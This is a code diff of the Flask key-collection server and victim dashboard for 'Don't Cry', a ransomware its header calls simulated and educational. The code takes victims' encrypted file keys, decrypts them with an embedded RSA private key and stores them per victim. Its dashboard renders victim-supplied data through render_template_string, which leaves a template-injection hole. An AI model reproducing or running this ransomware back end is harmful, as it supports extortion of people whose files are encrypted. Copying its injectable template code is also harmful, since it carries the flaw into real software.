@@ -1,5 +1,5 @@
-################################################################################
-#                             Don't Cry Ransomware                             #
+################################################################################ 
+#                             Don't Cry Ransomware                             # 
 #                          ! EDUCATIONAL PURPOSES ONLY !                       #
 ################################################################################
 # DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
@@ -10,13 +10,11 @@
 # The authors assume no liability for any misuse or damage caused.
 
 import os
-import os
 import json
 import base64
+from flask import Flask, request, render_template_string
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
-from flask import Flask, request, render_template_string
-
 
 RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
 MIIEqAIBAAKCAQEAjdIcVka2US3tcvXqQ90+XNYt5bJv10x+/0KRSph03Z/RIp/g
@@ -46,19 +44,16 @@ QgNRtXbP/ulZU8c8xyiIW1O4urxsgEzXB5Fcf870D9g1THPoVCfnQQZNWt1Hblop
 rz9v0fKUbjGqZGd/5hMzmWL6Lg2AnsxBXSCjEqm1x6SFuJMMmkmOMkWwANY=
 -----END RSA PRIVATE KEY-----"""
 
-
 app = Flask(__name__)
-BASE_FOLDER = "./dcry_victims"
+BASE_FOLDER = "~/dcry_victims/"
 
-if not os.path.exists(BASE_FOLDER):
-    os.makedirs(BASE_FOLDER)
+os.makedirs(BASE_FOLDER, exist_ok=True)
 
 
 def decrypt_key(encrypted_key):
     private_key = RSA.import_key(RSA_PRIVATE_KEY)
     cipher_rsa = PKCS1_OAEP.new(private_key)
-    aes_key = cipher_rsa.decrypt(encrypted_key)
-    return aes_key
+    return cipher_rsa.decrypt(encrypted_key)
 
 
 @app.route("/upload", methods=["POST"])
@@ -79,12 +74,10 @@ def upload():
     victim_folder = os.path.join(BASE_FOLDER, victim_id)
     os.makedirs(victim_folder, exist_ok=True)
 
-    info_path = os.path.join(victim_folder, "info.json")
-    with open(info_path, "w") as f:
+    with open(os.path.join(victim_folder, "info.json"), "w") as f:
         json.dump({"username": username, "id": victim_id, "date": date}, f, indent=2)
 
-    key_path = os.path.join(victim_folder, "key.txt")
-    with open(key_path, "w") as f:
+    with open(os.path.join(victim_folder, "key.txt"), "w") as f:
         f.write(decrypt_key(encrypted_key).decode())
 
     print(f"Saved victim: {victim_id}")
@@ -111,8 +104,8 @@ def dashboard():
             </div>
             """
 
-    return render_template_string(
-        f"""
+    html = f"""
+    <!DOCTYPE html>
     <html>
         <head>
             <title>Don't Cry Dashboard</title>
@@ -122,8 +115,9 @@ def dashboard():
             {victim_cards if victim_cards else "<p>No victims yet.</p>"}
         </body>
     </html>
-"""
-    )
+    """
+    return render_template_string(html)
 
 
-app.run(host="127.0.0.1", port=5000)
+if __name__ == "__main__":
+    app.run(host="127.0.0.1", port=5000)
